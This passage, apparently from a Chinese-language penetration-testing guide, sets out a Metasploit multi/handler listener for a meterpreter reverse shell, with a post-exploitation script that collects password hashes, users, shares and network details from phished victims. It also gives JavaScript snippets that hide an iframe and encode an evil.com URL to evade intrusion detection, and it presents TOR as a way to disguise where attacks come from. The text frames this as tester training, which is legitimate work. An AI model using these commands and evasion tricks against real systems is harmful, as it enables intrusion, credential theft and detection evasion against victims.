### 使用 Exploit/Multi/Handler 进行攻击

1. **启动 Exploit/Handler:**
   ```bash
   use exploit/multi/handler
   ```

2. **设置退出选项:**
   ```bash
   msf exploit(handler) > set ExitOnSession false
   ```

3. **受害者收到消息框:**
   - 数字签名将显示为“可信”信息。
   - 许多用户会运行此程序，这基本上是一种社会工程学/定向钓鱼攻击。

4. **设置有效载荷:**
   ```bash
   msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
   ```

5. **设置本地主机地址:**
   ```bash
   msf exploit(handler) > set LHOST 192.168.0.34
   ```

6. **设置监听端口:**
   ```bash
   msf exploit(handler) > set LPORT 8000
   ```

7. **设置自动化脚本并启用多处理模式:**
   ```bash
   msf exploit(handler) > set AutoRunScript ./PhishScrape.rb
   msf exploit(handler) > exploit -j
   ```
   攻击者可以使用任何脚本来进行后渗透自动化。附录中提供了一个示例脚本。

### 生成独立的 Meterpreter 二进制文件

- 攻击者可以使用各种方式将独立的 Meterpreter 二进制文件发送给目标，包括受感染的 PDF 文件、恶意网站、客户端漏洞利用或恶意 Java 小程序（如前面的示例）。
- 文档或 Meterpreter 本身可以直接作为附件通过邮件发送给目标，或者放置在网站上供受害者下载。

### 监控成功入侵

- 当看到以下信息时，表示目标已被成功入侵：
  ```bash
  [*] Transmitting intermediate stager for over-sized stage...(191 bytes)
  ```
- 可以使用以下命令列出所有可用的会话：
  ```bash
  sessions -l
  ```
- 然后可以使用标准的 Meterpreter 命令进行操作。

### 后渗透自动化脚本

- 部署 Meterpreter 后，将在每个目标上运行一个后渗透自动化脚本。根据脚本的复杂性和大小，这可能需要一些时间。
- 示例脚本将自动从目标收集信息，并将其存储在 `~/.msf3/logs/scraper` 中，每个目标将生成一个名为 `ipaddress_data_timestamp` 的子目录。

#### 自动收集的信息包括：

- `env.txt`: 系统环境
- `group.txt`: 域组信息
- `hashes.txt`: 可破解的密码哈希
- `localgroup.txt`: 本地组成员
- `nethood.txt`: 网络邻居信息
- `network.txt`: 详细的目标网络信息
- `services.txt`: 正在运行的服务（查找防病毒软件）
- `shares.txt`: 共享目录
- `system.txt`: 操作系统信息
- `users.txt`: 本地用户账户名称

### 其他自动化脚本资源

- DarkOperator 的脚本存档：[http://www.darkoperator.com/](http://www.darkoperator.com/)

## 第六章：混淆技术

### 6.1 简单的代码混淆方法

测试者可能希望使用代码混淆来尝试绕过任何网络或主机入侵检测系统。本文不会全面讨论所有已知的方法，但会介绍一些较简单的方法以帮助测试者。

#### IFRAME 混淆

许多攻击利用 HTML IFRAME 来部署漏洞利用程序，同时向用户显示预期内容。例如：
```html
<iframe src="malicious_url"></iframe>
```
某些系统可能会检测并阻止这些 IFRAME。攻击者采用简单的方法，如将 IFRAME 分解并通过 JavaScript 重新组装，以绕过简单的解析器。例如：
```javascript
var x = "rame"; 
var y = "i" + "f"; 
var el = document.createElement(y + x); 
el.setAttribute("width", 1); 
el.setAttribute("height", 1); 
el.setAttribute("s" + "rc", p); 
el.setAttribute("marg" + "inwidth", 0); 
el.setAttribute("marg" + "inheight", 0); 
el.setAttribute("scr" + "olling", "no"); 
el.setAttribute("f" + "rameborder", "0");
```

#### 字符编码

另一种攻击者用于混淆代码的方法是字符编码。攻击者将其 URL、命令或任何他们希望隐藏的内容转换为数值，然后编写一个小函数将这些值转换回字符串。例如：
```javascript
var p = (String.fromCharCode.apply(window, [104, 116, 116, 112, 58, 47, 47, 101, 118, 105, 108, 46, 99, 111, 109,]));
```

#### 转义码

转义码是攻击者使用的另一种编码方法，以混淆其代码并逃避潜在的检测。该过程将字符串字符转换为“%”符号转义的两位十六进制值。例如：
```plaintext
%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%63%6F%6D
```
解码后为：`http://evil.com`

更多深入的例子可以在以下链接中找到：[http://scriptasylum.com/tutorials/encdec/encode-decode.html](http://scriptasylum.com/tutorials/encdec/encode-decode.html)。

## 第七章：TOR

### 7.1 使用 TOR 作为武器

大多数使用 TOR 的人通常认为其主要用途是匿名浏览网页。然而，TOR 开发者设计了该软件以处理任何使用 TCP 的流量。本文结合了 TOR 的文档特性、互联网上的信息、数周的测试和调整以及自定义代码，展示了如何使 TOR 成为渗透测试工具包中的宝贵部分。

#### 渗透测试者为什么要理解 TOR

- 客户可能会阻止来自渗透测试者的 IP 地址的所有流量，以使其网络看起来更安全。
- 渗透测试者可以选择去酒店或咖啡馆使用公共 Wi-Fi 来掩盖其源 IP，但 TOR 是一个可能的替代方案。
- 它允许渗透测试者看起来像是从另一个城市甚至国家发起攻击。
- 从防御角度来看，了解这一点非常重要，因为这可以帮助检查流量过滤规则，防止误判攻击来源。

### 7.2 控制出口位置

（接下来的内容请继续...）